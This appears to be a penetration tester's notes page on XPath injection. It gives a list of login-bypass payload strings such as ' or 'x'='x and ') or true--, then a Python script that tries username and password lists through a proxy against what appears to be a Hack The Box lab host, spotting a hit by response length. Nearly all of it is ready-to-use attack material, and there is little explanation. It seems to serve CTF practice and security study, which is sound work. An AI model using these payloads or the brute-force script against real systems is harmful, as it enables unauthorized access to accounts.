XPATH

https://book.hacktricks.xyz/pentesting-web/xpath-injection
https://www.scip.ch/en/?labs.20180802
https://www.note4tech.com/post/sql-injection-tutorial-login-bypass

* * *

**XPATH Injection (Bypassing login)**
https://www.note4tech.com/post/sql-injection-tutorial-login-bypass

'-'

' '

'&'

'^'

'*'

' or ''-'

' or '' '

' or ''&'

' or ''^'

' or ''*'

"-"

" "

"&"

"^"

"*"

" or ""-"

" or "" "

" or ""&"

" or ""^"

" or ""*"

or true--

" or true--

' or true--

") or true--

') or true--

' or 'x'='x

') or ('x')=('x

')) or (('x'))=(('x

" or "x"="x

") or ("x")=("x

")) or (("x"))=(("x

* * *

**Brute force script (Blind XPATH Injection)**
https://www.scip.ch/en/?labs.20180802

#!/usr/bin/env python3

import requests
import sys

userpath = "/home/greg/htb/unbalanced/users.lst"

url = "http://172.31.179.1/intranet.php"
proxy = {
        "http":"http://10.10.10.200:3128",
        "https":"http://10.10.10.200:3128"}

def login(user, password):

    #print("Trying " + user, password)
    r = requests.post(url, proxies=proxy, data = {

            "Username": user,
            "Password": password

        })

    return r.text

with open(userpath, "r") as raw_users:
    users = [ line.strip() for line in raw_users.read().split("\n") if line ]

refLength = len(login("admin","admin"))
print(refLength)

for user in users:
    i=0

    passwordspath = "/home/greg/htb/unbalanced/" + user + "-passwords-tmp-002.lst"

    print(passwordspath)
    with open(passwordspath, "r") as raw_passwords:

        passwords = [ line.strip() for line in raw_passwords.read().split("\n") if line ]

    print("Working on " + user + "...")
    for password in passwords:
        i+=1
        resp1 = login(user, password)

        if len(resp1) == refLength:
            if i % 100 == 1:
                print("Still working on it...")
            continue
        print("Got it !!!"+ "\n" + user + " have password => " + password)
        break